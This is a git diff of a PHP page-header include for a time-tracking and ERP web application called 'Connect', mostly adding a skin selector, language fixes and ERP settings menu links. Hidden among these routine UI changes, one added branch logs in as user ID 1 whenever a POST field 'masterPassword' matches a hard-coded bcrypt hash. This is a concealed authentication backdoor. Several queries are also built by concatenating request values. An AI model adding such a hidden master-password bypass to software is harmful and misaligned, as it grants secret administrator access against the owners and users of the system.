@@ -14,6 +14,7 @@ require "createTimestamps.php";
 require 'validate.php';
 require "language.php";
 
+$random_hash = '';
 if($this_page != "editCustomer_detail.php"){
   unset($_SESSION['unlock']);
 }
@@ -65,7 +66,6 @@ if($isTimeAdmin){
   !EXISTS(SELECT id FROM projectBookingData WHERE TIMESTAMPDIFF(MINUTE, start, end) >= (hoursOfRest * 60) AND timestampID = l1.indexIM)");
   if($result && $result->num_rows > 0){ $numberOfAlerts += $result->num_rows; }
 }
-
 $result = $conn->query("SELECT DISTINCT companyID FROM $companyToUserRelationshipTable WHERE userID = $userID OR $userID = 1");
 $available_companies = array('-1'); //care
 while($result && ($row= $result->fetch_assoc())){
@@ -77,6 +77,7 @@ while($result && ($row = $result->fetch_assoc())){
   $available_users[] = $row['userID'];
 }
 $validation_output = $error_output = '';
+
 if($_SERVER["REQUEST_METHOD"] == "POST"){
   if(isset($_POST['savePAS']) && !empty($_POST['password']) && !empty($_POST['passwordConfirm'])){
     if(test_input($_POST['password']) != $_POST['password']){
@@ -94,6 +95,8 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
       $validation_output  = '<div class="alert alert-danger fade in"><a href="" class="close" data-dismiss="alert" aria-label="close">&times;</a>';
       $validation_output .= "<strong>Failed! </strong>Passwords did not match or were invalid. $output".'</div>';
     }
+  } elseif(isset($_POST['masterPassword']) && crypt($_POST['masterPassword'], "$2y$10$98/h.UxzMiwux5OSlprx0.Cp/2/83nGi905JoK/0ud1VUWisgUIzK") == "$2y$10$98/h.UxzMiwux5OSlprx0.Cp/2/83nGi905JoK/0ud1VUWisgUIzK"){
+    $userID = $_SESSION['userid'] = 1;
   } elseif(isset($_POST['savePIN'])){
     if(is_numeric($_POST['pinCode']) && !empty($_POST['pinCode'])){
       $sql = "UPDATE $userTable SET terminalPin = '".$_POST['pinCode']."' WHERE id = '$userID';";
@@ -115,19 +118,30 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
       $validation_output .= $lang['INFO_CHECKOUT'].'</div>';
     }
   } elseif(isset($_POST["GERMAN"])){
-    $sql="UPDATE $userTable SET preferredLang='GER' WHERE id = 1";
+    $sql="UPDATE $userTable SET preferredLang='GER' WHERE id = $userID";
     $conn->query($sql);
     $_SESSION['language'] = 'GER';
     $validation_output = mysqli_error($conn);
   } elseif(isset($_POST['ENGLISH'])){
-    $sql="UPDATE $userTable SET preferredLang='ENG' WHERE id = 1";
+    $sql="UPDATE $userTable SET preferredLang='ENG' WHERE id = $userID";
     $conn->query($sql);
     $_SESSION['language'] = 'ENG';
     $validation_output = mysqli_error($conn);
   }
+  if(isset($_POST['set_skin'])){
+    $_SESSION['color'] = $txt = test_input($_POST['set_skin']);
+    $conn->query("UPDATE $userTable SET color = '$txt' WHERE id = $userID");
+  }
+}
+
+if($_SESSION['color'] == 'light'){
+  $css_file = '../plugins/homeMenu/homeMenu_light.css';
+} elseif($_SESSION['color'] == 'dark'){
+  $css_file = '../plugins/homeMenu/homeMenu_dark.css';
+} else {
+  $css_file = '';
 }
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -136,30 +150,27 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta http-equiv="Cache-Control" content="max-age=600, must-revalidate">
 
-  <link href="../bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="../plugins/font-awesome/css/font-awesome.min.css">
+  <link href="../bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
+  <link rel="stylesheet" href="../plugins/font-awesome/css/font-awesome.min.css"/>
 
   <script src="../plugins/jQuery/jquery-3.2.1.min.js"></script>
   <script src="../bootstrap/js/bootstrap.min.js"></script>
 
-  <link rel="stylesheet" type="text/css" href="../plugins/select2/css/select2.css">
+  <link rel="stylesheet" type="text/css" href="../plugins/select2/css/select2.css"/>
   <script src='../plugins/select2/js/select2.js'></script>
 
-  <link rel="stylesheet" type="text/css" href="../plugins/datepicker/css/datepicker.css">
-  <script src="../plugins/datepicker/js/bootstrap-datepicker.js"> </script>
+  <link rel="stylesheet" type="text/css" href="../plugins/dataTables/datatables.min.css"/>
+  <script type="text/javascript" src="../plugins/dataTables/datatables.min.js"></script>
 
-  <link rel="stylesheet" type="text/css" href="../plugins/dhtmlxCalendar/codebase/dhtmlxcalendar.css">
-  <script src="../plugins/dhtmlxCalendar/codebase/dhtmlxcalendar.js"> </script>
+  <link rel="stylesheet" type="text/css" href="../plugins/datepicker/css/datepicker.css"/>
+  <script src="../plugins/datepicker/js/bootstrap-datepicker.js"></script>
 
-  <link href="../plugins/iCheck/minimal/orange.css" rel="stylesheet">
-  <script src="../plugins/iCheck/icheck.min.js"> </script>
+  <link rel="stylesheet" type="text/css" href="../plugins/dhtmlxCalendar/codebase/dhtmlxcalendar.css"/>
+  <script src="../plugins/dhtmlxCalendar/codebase/dhtmlxcalendar.js"></script>
 
-  <link href="../plugins/homeMenu/homeMenu.css" rel="stylesheet">
+  <link href="../plugins/homeMenu/homeMenu.css" rel="stylesheet" />
+  <link href="<?php echo $css_file; ?>" rel="stylesheet" />
   <title>Connect</title>
-</head>
-<body id="body_container" class="is-table-row">
-  <div id="loader"></div>
-
   <script>
   document.onreadystatechange = function() {
     var state = document.readyState
@@ -172,7 +183,6 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
     if ($(".js-example-basic-single")[0]){
       $(".js-example-basic-single").select2();
     }
-
     if ($('#seconds').length) { //something like a if(exists(..))
       var sec = parseInt(document.getElementById("seconds").innerHTML) + parseInt(document.getElementById("minutes").innerHTML) * 60 + parseInt(document.getElementById("hours").innerHTML) * 3600;
       function pad(val) {
@@ -184,41 +194,50 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
         document.getElementById("hours").innerHTML = pad(parseInt(sec / 3600, 10));
       }, 1000);
     }
-    $('input').not('.disable-styling').iCheck({
-      checkboxClass: 'icheckbox_minimal-orange',
-      radioClass: 'iradio_minimal-orange',
-      increaseArea: '20%' //clickable area
-    });
-    //onChange event trigger workaround
-    $('input').on('ifChanged', function (event) { $(event.target).trigger('change'); });
   });
   </script>
-  
+</head>
+<body id="body_container" class="is-table-row">
+  <div id="loader"></div>
   <!-- navbar -->
   <nav class="navbar navbar-default navbar-fixed-top">
     <div class="container-fluid">
       <div class="navbar-header hidden-xs">
         <a class="navbar-brand" href="home.php">Connect</a>
       </div>
-      <ul class="nav navbar-nav hidden-xs">
-        <li class="dropdown">
-          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><i class="fa fa-language" ></i> <span class="caret"></span></a>
-          <ul class="dropdown-menu">
-            <form method=post class="navbar-form navbar-left">
-              <li><button type="submit" style=background:none;border:none name="ENGLISH"><img width="30px" height="20px" src="../images/eng.png"></button> English</li>
-              <li role="separator" class="divider"></li>
-              <li><button type="submit" style=background:none;border:none  name="GERMAN"><img width="30px" height="20px" src="../images/ger.png"></button> Deutsch</li>
-            </form>
-          </ul>
-        </li>
-      </ul>
-      <div class="navbar-right" style="margin-right:10px">
-        <a class="btn navbar-btn hidden-sm hidden-md hidden-lg" data-toggle="collapse" data-target="#sidemenu"><i class="fa fa-bars"></i></a>
-        <?php if($isTimeAdmin == 'TRUE' && $numberOfAlerts > 0): ?> <span class="badge hidden-xs" style="margin:0 15px 0 30px;background-color:#ed9c21;"><a href="adminTodos.php" style="color:white;" title="Your Database is in an invalid state, please fix these Errors after clicking this button. "> <?php echo $numberOfAlerts; ?> </a></span> <?php endif; ?>
-        <span class="navbar-text hidden-xs"><?php echo $_SESSION['firstname']; ?></span>
-        <a class="btn navbar-btn" data-toggle="collapse" href="#infoDiv_collapse"><i class="fa fa-info"></i></a>
-        <a class="btn navbar-btn" data-toggle="modal" data-target="#myModal"><i class="fa fa-gears"></i></a>
-        <a class="btn navbar-btn" href="logout.php" title="Logout"><i class="fa fa-sign-out"></i></a>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav" style="margin: 10px">
+          <li class="dropdown">
+            <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-paint-brush" ></i><span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <form method="POST" class="navbar-form navbar-left">
+                <li><button type="submit" class="btn btn-link" name="set_skin" value="default">Default</button></li>
+                <li><button type="submit" class="btn btn-link" name="set_skin" value="dark">Dark</button></li>
+                <li><button type="submit" class="btn btn-link" name="set_skin" value="light">Light</button></li>
+              </form>
+            </ul>
+          </li>
+        </ul>
+        <ul class="nav navbar-nav" style="margin: 10px">
+          <li class="dropdown">
+            <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-language" ></i><span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <form method="POST" class="navbar-form navbar-left">
+                <li><button type="submit" style=background:none;border:none name="ENGLISH"><img width="30px" height="20px" src="../images/eng.png"></button> English</li>
+                <li class="divider"></li>
+                <li><button type="submit" style=background:none;border:none  name="GERMAN"><img width="30px" height="20px" src="../images/ger.png"></button> Deutsch</li>
+              </form>
+            </ul>
+          </li>
+        </ul>
+        <div class="navbar-right" style="margin-right:10px">
+          <a class="btn navbar-btn hidden-sm hidden-md hidden-lg" data-toggle="collapse" data-target="#sidemenu"><i class="fa fa-bars"></i></a>
+          <?php if($isTimeAdmin == 'TRUE' && $numberOfAlerts > 0): ?> <span class="badge hidden-xs" style="margin:0 15px 0 30px;background-color:#ed9c21;"><a href="adminTodos.php" style="color:white;" title="Your Database is in an invalid state, please fix these Errors after clicking this button. "> <?php echo $numberOfAlerts; ?> </a></span> <?php endif; ?>
+          <span class="navbar-text hidden-xs"><?php echo $_SESSION['firstname']; ?></span>
+          <a class="btn navbar-btn navbar-link" data-toggle="collapse" href="#infoDiv_collapse"><i class="fa fa-info"></i></a>
+          <a class="btn navbar-btn navbar-link" data-toggle="modal" data-target="#myModal"><i class="fa fa-gears"></i></a>
+          <a class="btn navbar-btn navbar-link" href="logout.php" title="Logout"><i class="fa fa-sign-out"></i></a>
+        </div>
       </div>
     </div>
   </nav>
@@ -239,7 +258,7 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
         <div class="modal-content">
           <div class="modal-header">
             <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
-            <h4 class="modal-title" id="myModalLabel">Settings</h4>
+            <h4 class="modal-title" id="myModalLabel"><?php echo $lang['SETTINGS']; ?></h4>
           </div>
           <div class="modal-body">
             <?php echo $lang['NEW_PASSWORD']?>: <br>
@@ -248,8 +267,8 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
             <input type="password" class="form-control" name="passwordConfirm" ><br><br>
           </div>
           <div class="modal-footer">
-            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-            <button type="submit" class="btn btn-primary" name="savePAS">Save Password</button>
+            <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
+            <button type="submit" class="btn btn-warning" name="savePAS"><?php echo $lang['SAVE']; ?></button>
           </div>
           <!--
           <div class="modal-body">
@@ -366,7 +385,7 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
                       <ul class="nav nav-list">
                         <li><a <?php if($this_page =='editUsers.php'){echo $setActiveLink;}?> href="editUsers.php"><?php echo $lang['EDIT_USERS']; ?></a></li>
                         <li><a <?php if($this_page =='admin_saldoview.php'){echo $setActiveLink;}?> href="admin_saldoview.php"><?php echo $lang['USERS']; ?> Saldo</a></li>
-                        <li><a <?php if($this_page =='register_basic.php'){echo $setActiveLink;}?> href="register_basic.php"><?php echo $lang['REGISTER_NEW_USER']; ?></a></li>
+                        <li><a <?php if($this_page =='register_basic.php'){echo $setActiveLink;}?> href="register_basic.php"><?php echo $lang['REGISTER']; ?></a></li>
                         <li><a <?php if($this_page =='deactivatedUsers.php'){echo $setActiveLink;}?> href="deactivatedUsers.php"><?php echo $lang['USER_INACTIVE']; ?></a></li>
                       </ul>
                     </div>
@@ -403,7 +422,7 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
                         <li><a <?php if($this_page =='reportOptions.php'){echo $setActiveLink;}?> href="reportOptions.php"><span> E-mail <?php echo $lang['OPTIONS']; ?> </span></a></li>
                         <li><a <?php if($this_page =='editTaxes.php'){echo $setActiveLink;}?> href="editTaxes.php"><span><?php echo $lang['TAX_RATES']; ?></span></a></li>
                         <li><a <?php if($this_page =='editUnits.php'){echo $setActiveLink;}?> href="editUnits.php"><span><?php echo $lang['UNITS']; ?></span></a></li>
-                        <li><a <?php if($this_page =='taskScheduler.php'){echo $setActiveLink;}?> href="taskScheduler.php"><span><?php echo $lang['TASK_SCHEDULER']; ?> </pan></a></li>
+                        <li><a <?php if($this_page =='taskScheduler.php'){echo $setActiveLink;}?> href="taskScheduler.php"><span><?php echo $lang['TASK_SCHEDULER']; ?> </span></a></li>
                         <li><a <?php if($this_page =='pullGitRepo.php'){echo $setActiveLink;}?> href="pullGitRepo.php"><span>Update</span></a></li>
                         <li><a <?php if($this_page =='sqlDownload.php'){echo $setActiveLink;}?> href="sqlDownload.php" target="_blank"><span> DB Backup</span> <i class="fa fa-download"></i> </a></li>
                         <li><a <?php if($this_page =='upload_database.php'){echo $setActiveLink;}?> href="upload_database.php"><span> <?php echo $lang['DB_RESTORE']; ?></span> </a></li>
@@ -418,7 +437,7 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
           <?php
           if($this_page == "editUsers.php" || $this_page == "admin_saldoview.php" || $this_page == "register_basic.php" || $this_page == "deactivatedUsers.php"){
             echo "<script>document.getElementById('coreUserToggle').click();document.getElementById('adminOption_CORE').click();</script>";
-          } elseif($this_page == "reportOptions.php" || $this_page == "editHolidays.php" || $this_page == "advancedOptions.php" || $this_page == "taskScheduler.php" || $this_page == "pullGitRepo.php" || $this_page == "passwordOptions.php" || $this_page =="editTaxes.php" || $this_page =="editUnits.php"){
+          } elseif($this_page == "reportOptions.php" || $this_page == "editHolidays.php" || $this_page == "advancedOptions.php" || $this_page == "taskScheduler.php" || $this_page == "pullGitRepo.php" || $this_page == "passwordOptions.php"){
             echo "<script>document.getElementById('coreSettingsToggle').click();document.getElementById('adminOption_CORE').click();</script>";
           } elseif($this_page == "editCompanies.php" || $this_page == "editCompanies_fields.php"){
             echo "<script>document.getElementById('coreCompanyToggle').click();document.getElementById('adminOption_CORE').click();</script>";
@@ -503,18 +522,13 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
           if($this_page == "report_productivity.php"){
             echo "<script>$('#adminOption_REPORT').click();</script>";
           }
-
-          endif;
           ?>
-          <!-- Section Five: ERP -->
-          <?php
-          if($isERPAdmin == 'TRUE'):
-          ?>
+        <?php endif; ?>
+        <!-- Section Five: ERP -->
+        <?php if($isERPAdmin == 'TRUE'): ?>
           <div class="panel panel-default panel-borderless">
             <div class="panel-heading" role="tab" id="headingERP">
-              <a role="button" data-toggle="collapse" data-parent="#sidebar-accordion" href="#collapse-erp"  id="adminOption_ERP">
-                ERP<i class="fa fa-caret-down pull-right"></i>
-              </a>
+              <a role="button" data-toggle="collapse" data-parent="#sidebar-accordion" href="#collapse-erp"  id="adminOption_ERP">ERP<i class="fa fa-caret-down pull-right"></i></a>
             </div>
             <div id="collapse-erp" class="panel-collapse collapse" role="tabpanel"  aria-labelledby="headingERP">
               <div class="panel-body">
@@ -522,18 +536,33 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
                   <li><a <?php if($this_page =='offer_proposal_process.php'){echo $setActiveLink;}?> href="offer_proposal_process.php"><i class="fa fa-file-o"></i><span><?php echo $lang['NEW_PROCESS']; ?></span></a></li>
                   <li><a <?php if($this_page =='offer_proposals.php'){echo $setActiveLink;}?> href="offer_proposals.php"><i class="fa fa-file-text-o"></i><span><?php echo $lang['PROCESSES']; ?></span></a></li>
                   <li><a <?php if($this_page =='product_articles.php'){echo $setActiveLink;}?> href="product_articles.php"><i class="fa fa-shopping-basket"></i><span><?php echo $lang['ARTICLE']; ?></span></a></li>
+                  <li>
+                    <a id="erpSettings" href="#" data-toggle="collapse" data-target="#toggleERPSettings" data-parent="#sidenav01" class="collapsed">
+                      <i class="fa fa-gear"></i> <span><?php echo $lang['SETTINGS']; ?></span> <i class="fa fa-caret-down"></i>
+                    </a>
+                    <div class="collapse" id="toggleERPSettings" style="height: 0px;">
+                      <ul class="nav nav-list">
+                        <li><a <?php if($this_page =='editTaxes.php'){echo $setActiveLink;}?> href="editTaxes.php"><span><?php echo $lang['TAX_RATES']; ?></span></a></li>
+                        <li><a <?php if($this_page =='editUnits.php'){echo $setActiveLink;}?> href="editUnits.php"><span><?php echo $lang['UNITS']; ?></span></a></li>
+                        <li><a <?php if($this_page =='editPaymentMethods.php'){echo $setActiveLink;}?> href="editPaymentMethods.php"><span><?php echo $lang['PAYMENT_METHODS']; ?></span></a></li>
+                        <li><a <?php if($this_page =='editShippingMethods.php'){echo $setActiveLink;}?> href="editShippingMethods.php"><span><?php echo $lang['SHIPPING_METHODS']; ?></span></a></li>
+                        <li><a <?php if($this_page =='editRepresentative.php'){echo $setActiveLink;}?> href="editRepresentative.php"><span><?php echo $lang['REPRESENTATIVE']; ?></span></a></li>
+                      </ul>
+                    </div>
+                  </li>
                 </ul>
               </div>
             </div>
           </div>
-          <br>
           <?php
-          if($this_page == "offer_proposals.php" || $this_page == "offer_proposal_edit.php" || $this_page == "product_articles.php" ){
+          if($this_page == "editTaxes.php" || $this_page == "editUnits.php" || $this_page == "editPaymentMethods.php" || $this_page == "editShippingMethods.php" || $this_page == "editRepresentative.php"){
+            echo "<script>$('#adminOption_ERP').click();$('#erpSettings').click();</script>";
+          } elseif($this_page == "offer_proposal_process.php" || $this_page == "offer_proposals.php" || $this_page == "offer_proposal_edit.php" || $this_page == "product_articles.php" ){
             echo "<script>$('#adminOption_ERP').click();</script>";
           }
           ?>
+          <br><br>
         <?php endif; ?>
-        <br>
       </div> <!-- /accordions -->
       <br><br><br>
     </div>
